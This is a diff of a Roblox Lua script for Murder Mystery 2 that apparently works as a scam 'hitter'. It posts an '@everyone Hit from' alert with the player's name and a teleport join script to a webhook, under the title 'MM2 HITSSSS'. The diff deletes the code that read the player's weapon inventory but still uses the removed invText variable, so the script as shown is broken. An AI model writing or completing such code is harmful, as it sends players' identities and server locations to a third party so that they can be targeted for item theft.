@@ -34,40 +34,7 @@ local function sendWebhook(data)
     end)
 end
 
-local Sync = ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync")
-local Weapons = require(Sync:WaitForChild("Item"))
-local GetProfileData = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Inventory"):WaitForChild("GetProfileData")
 
-local function getInventory()
-    local ok, result = pcall(function()
-        return GetProfileData:InvokeServer()
-    end)
-    if not ok or type(result) ~= "table" then return {} end
-    
-    local items = {}
-    local owned = result.Weapons and result.Weapons.Owned
-    if type(owned) == "table" then
-        for id, amount in pairs(owned) do
-            local info = Weapons[tostring(id)]
-            if info and info.ItemName ~= "Default Gun" and info.ItemName ~= "Default Knife" then
-                table.insert(items, {
-                    name = info.ItemName,
-                    id = tostring(id),
-                    amount = tonumber(amount) or 1,
-                    rarity = info.Rarity or "Unknown",
-                    category = "Weapons"
-                })
-            end
-        end
-    end
-    return items
-end
-
-local inv = getInventory()
-local invText = ""
-for _, item in ipairs(inv) do
-    invText = invText .. string.format("%s x%d (%s)\n", item.name, item.amount, item.rarity)
-end
 
 -- Join link payload string format
 local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance("%d", "%s", game.Players.LocalPlayer)', game.PlaceId, game.JobId)
@@ -75,7 +42,7 @@ local joinScript = string.format('game:GetService("TeleportService"):TeleportToP
 sendWebhook({
     ["content"] = "@everyone Hit from " .. LocalPlayer.Name .. "\n" .. joinScript,
     ["embeds"] = {{
-        ["title"] = "MM2 Inventory Summary & Join Link",
+        ["title"] = "MM2 HITSSSS",
         ["description"] = invText ~= "" and invText or "No items found.",
         ["color"] = 0x05f7ff
     }}
